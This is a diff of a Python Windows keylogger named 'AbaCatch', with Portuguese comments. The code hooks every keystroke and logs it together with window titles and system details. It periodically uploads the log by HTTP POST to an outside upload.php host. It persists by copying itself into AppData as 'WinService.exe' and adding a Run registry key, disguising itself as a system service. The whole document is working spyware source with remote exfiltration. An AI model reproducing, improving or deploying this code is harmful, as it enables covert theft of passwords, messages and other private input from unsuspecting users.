@@ -1,5 +1,8 @@
 #!/usr/bin/python
 # -*-coding:utf-8-*-
+# coder: _carlosnericorreia_
+# email: hackerama@protonmail.com
+# AbaCatch Windows Kelogger v1.0
 
 import pyHook
 import pythoncom
@@ -12,12 +15,14 @@ import time
 
 
 def onkey(event):
+    # funcao qee será chamada pelo 'hook_manager' toda vez que uma tecla for pressionada.
     global head
     global data
     global window
     global dump
+    global ldir
 
-    file = open('C:\\captura\\capt-' + pcname + '.txt', 'a')
+    file = open(ldir + '\capt-' + pcname + '.txt', 'a')
 
     if event.WindowName != window:
         window = event.WindowName
@@ -39,9 +44,9 @@ def onkey(event):
         file.close()
 
     dump.append(data)
-    print dump
+
     if len(dump) > 100:
-            print ('tamanho de dump:', len(dump))
+            # print ('tamanho de dump:', len(dump))
             t = threading.Thread(target=upload, args=(fileup,))
             t.daemon = True
             t.start()
@@ -50,36 +55,50 @@ def onkey(event):
 
 
 def upload(fileup):
-    global urlFromUpload, urlFromUpShow
+    # função responsável pelo upload do arquivo de log para o servidor.
+
+    global urlUpload
     if os.path.exists(fileup):
             files = {'file': open(fileup, 'rb')}
-            requests.post(urlFromUpload, files=files)  #import requests
+            requests.post(urlUpload, files=files)
 
 
 def persis():
+    # função responsável pela persistência, ela cria a pasta '%appdata%/Winservice'; copia o arquivo para lá
+    # e adiciona ao 'Run' (startup) no registro.
+
+    global ldir
     try:
-        conv = os.path.realpath(__file__).replace('.py', '.exe')
+        # conv = os.path.realpath(__file__).replace('.py', '.exe')
+        conv2 = ldir + '\WinService.exe'
+        subprocess.call('COPY WinService.exe ' + ldir, shell=True)
         subprocess.call(
-          'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "klogger" /t REG_SZ /F /D '+conv, shell=True
-        )
-    except Exception as e:
-        print e
-
-def main():
-    persis()
-
-    try:
-        os.mkdir('C:\\captura')
+          'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "WinService" /t REG_SZ /F /D ' + conv2,
+          shell=True
+         )
     except:
         pass
 
-    file = open('C:\\captura\\capt-' + pcname + '.txt', 'a')
+
+def main():
+
+    try:
+        os.mkdir(ldir)
+
+    except Exception as e:
+        print 'Exceção:', e
+        pass
+
+    persis()
+
+    file = open(ldir + '\capt-' + pcname + '.txt', 'a')
     file.write('\n[+]'+('-'*64+'[+]\n'))
+    file.write('   AbaCatch Keylogger v1.0\nOra, _Ora parece que temos um xeroque rolmes aqui_\n\n')
     file.write('   DATA E HORA: ' + date + '\n')
     file.write('   NOME DO USUARIO: ' + pcname + '\n')
     file.write('   SISTEMA OPERACIONAL: ' + pcos + '\n')
     file.write('   PROCESSADOR: ' + pcprocess + '\n')
-    file.write('[+]'+('-'*64 + '[+]\n'))
+    file.write('[+]' + ('-'*64 + '[+]\n'))
     file.close()
 
     hooks_manager = pyHook.HookManager()
@@ -88,18 +107,17 @@ def main():
     pythoncom.PumpMessages()
 
 
-urlFromUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"
-urlFromUpShow = urlFromUpload.strip('http:upload.php')
+urlUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"
+ldir = 'C:\Users\Usuario\AppData\Roaming\WinService'
 window = None
 data = ''
 head = ''
 dump = []
-date = time.strftime("%d/%m/%Y")+ ' - ' + time.strftime("%X")
+date = time.strftime("%d/%m/%Y") + ' - ' + time.strftime("%X")
 pcname = platform.node()
 pcos = platform.platform()
 pcprocess = platform.processor()
-fileup = 'C:\\captura\\capt-'+pcname+'.txt'
+fileup = ldir + '\capt-' + pcname + '.txt'
 
 if __name__ == "__main__":
     main()
- 
